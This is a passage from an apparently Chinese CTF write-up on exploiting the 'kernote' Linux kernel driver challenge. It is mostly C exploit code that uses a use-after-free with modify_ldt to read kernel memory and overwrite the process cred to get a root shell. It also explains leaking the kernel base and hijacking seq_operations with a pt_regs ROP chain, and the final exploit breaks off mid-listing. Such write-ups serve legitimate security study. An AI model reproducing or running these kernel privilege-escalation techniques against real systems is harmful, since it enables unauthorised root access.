class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    cur_pid = getpid();</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    cred_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">            result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">            <span class="keyword">if</span> (result_addr \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">            &#123;</span><br><span class="line">                cred_addr = result_addr[<span class="number">-2</span>]; <span class="comment">// task_struct-&gt;cred</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m%lx\n&quot;</span>, cred_addr);</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (cred_addr)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//chunkEdit(cred_addr + 4);</span></span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval) <span class="comment">// child&#x27;s child</span></span><br><span class="line">        &#123;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                chunkAdd(i);</span><br><span class="line">            chunkSet(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                chunkDel(i);</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">                chunkEdit(cred_addr + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">        desc.base_addr = <span class="number">0</span>;</span><br><span class="line">        desc.entry_number = <span class="number">2</span>;</span><br><span class="line">        desc.limit = <span class="number">0</span>;</span><br><span class="line">        desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">        desc.contents = <span class="number">0</span>;</span><br><span class="line">        desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">        desc.lm = <span class="number">0</span>;</span><br><span class="line">        desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">        desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">        desc.useable = <span class="number">0</span>;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">        sleep(<span class="number">114514</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (geteuid())</span><br><span class="line">        errExit(<span class="string">&quot;FAILED TO GET THE ROOT!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] SUCCESSFUL to get the ROOT, execve ROOT SHELL soom...\033[0m&quot;</span>);</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打远程的脚本可以参照 kbrop 的</p></blockquote><p>不一定能一次成功，有的时候需要多试几次，笔者个人推测应当是 freelist 随机化的缘故</p><p><img src="https://i.loli.net/2021/10/31/QI7FzGx3RYDlPfE.png" alt="image.png"></p><h3 id="解法二：劫持-seq-operations-利用-pt-regs-进行-ROP-完成稳定化提权"><a href="#解法二：劫持-seq-operations-利用-pt-regs-进行-ROP-完成稳定化提权" class="headerlink" title="解法二：劫持 seq_operations 利用 pt_regs 进行 ROP 完成稳定化提权"></a>解法二：劫持 seq_operations 利用 pt_regs 进行 ROP 完成稳定化提权</h3><p>这个解法是笔者<strong>结合官方的解法与冠军战队 organizers 的解法得来的新解法</strong>，前面两步基本上和官方解法是一样的，都是利用 modify_ldt 系统调用读取内核空间的数据，不同的是笔者在这一步中选择读出内核“堆”上存储的指针以泄露内核基址，最后劫持 seq_operations 进行稳定化提权</p><h4 id="Step-I-泄露-page-offset-base-1"><a href="#Step-I-泄露-page-offset-base-1" class="headerlink" title="Step I. 泄露 page_offset_base"></a>Step I. 泄露 page_offset_base</h4><p>和解法一相同，利用 read_ldt() 与 copy 系函数不会引起 kernel panic 的特性爆破内核的“堆”区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(page_offset_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step-II-泄露内核基址"><a href="#Step-II-泄露内核基址" class="headerlink" title="Step II. 泄露内核基址"></a>Step II. 泄露内核基址</h4><p>这一步和解法一的 step II 相同，不同的是笔者在这一步通过子进程获取到内核“堆”上数据后并非用以搜索 task_struct 地址，而是尝试<strong>找到属于内核的函数指针，以此泄露内核基址</strong></p><p>经过笔者调试发现 <code>内核基址 + 0x40</code> 这个地址经常在内核“堆”一开头不远的地方就会出现（尚未验证具体为何指针），故笔者选择以该数据来计算内核基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf[i] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = buf[i] -  <span class="number">0x040</span>;</span><br><span class="line">                    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%lx\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>经笔者本地多次实验，这个地址<strong>总会出现在内核“堆”的 0x9d000 偏移处</strong>，或许我们总能从该地址稳定地泄露出内核的基址？</p></blockquote><h4 id="Step-III-利用-seq-operations-pt-regs-结构体完成稳定化-ROP-进行提权"><a href="#Step-III-利用-seq-operations-pt-regs-结构体完成稳定化-ROP-进行提权" class="headerlink" title="Step III. 利用 seq_operations + pt_regs 结构体完成稳定化 ROP 进行提权"></a>Step III. 利用 seq_operations + pt_regs 结构体完成稳定化 ROP 进行提权</h4><blockquote><p>参照了今年的冠军战队 Organizers 的 <a href="https://ctftime.org/writeup/30589">WP</a>，十分美妙的一种解法！</p></blockquote><p>现在有了内核基址，我们又能分配 0x20 大小的 object，这个大小有个结构体相信大家都十分熟悉——<code>seq_operations</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其 <code>start</code> 指针<strong>既是我们可以控制的，也是我们可以触发的</strong>，我们只需要打开 <code>/proc/self/stat</code> 文件进行读取即可触发该指针，这让我们很轻松地就能控制内核执行流</p><p>接下来我们来考虑如何仅使用一个指针便能完成 ROP 的流程，这里需要用到一个叫做 pt_regs 的结构体，该结构体的<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">定义</a>如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是一个十分有趣的结构体，我们观察到其各字段命名使用的<strong>全都是寄存器的名称</strong>，这是因为该结构体与系统调用的流程有关，内核中处理系统调用的入口函数为 <code>entry_SYSCALL_64</code>，其源码中有着<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">这样一条指令</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure><p>这是一条十分有趣的指令，它会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底：</p><p>[<img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" alt="image.png">](</p><p>我们不难想到的是，当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p><p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，<strong>这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：</strong></p><ul><li><strong>只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 进行栈迁移便能够完成 ROP</strong></li></ul><h4 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h4><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff8266b780</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810ca2b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810c9dd0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81075c4c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00fb0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> commit_creds;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> kernote_fd;</span><br><span class="line"><span class="type">long</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] %s \033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkSet</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6666</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkAdd</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6667</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkDel</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6668</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkEdit</span><span class="params">(<span class="type">size_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6669</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkFuck</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x666A</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">size_t</span>              temp;</span><br><span class="line">    <span class="type">int</span>                 retval;</span><br><span class="line">    <span class="type">size_t</span>                kernel_base;</span><br><span class="line">    <span class="type">size_t</span>              kernel_offset;</span><br><span class="line">    <span class="type">size_t</span>                search_addr;</span><br><span class="line">    <span class="type">size_t</span>              per_search_addr;</span><br><span class="line">    <span class="type">size_t</span>              *result_addr;</span><br><span class="line">    <span class="type">int</span>                   cur_pid;</span><br><span class="line">    <span class="type">size_t</span>                *buf;</span><br><span class="line">    <span class="type">int</span>                 pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">cpu_set_t</span>           cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit... \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    kernote_fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    chunkAdd(<span class="number">0</span>);</span><br><span class="line">    chunkSet(<span class="number">0</span>);</span><br><span class="line">    chunkDel(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">while</span>(<span 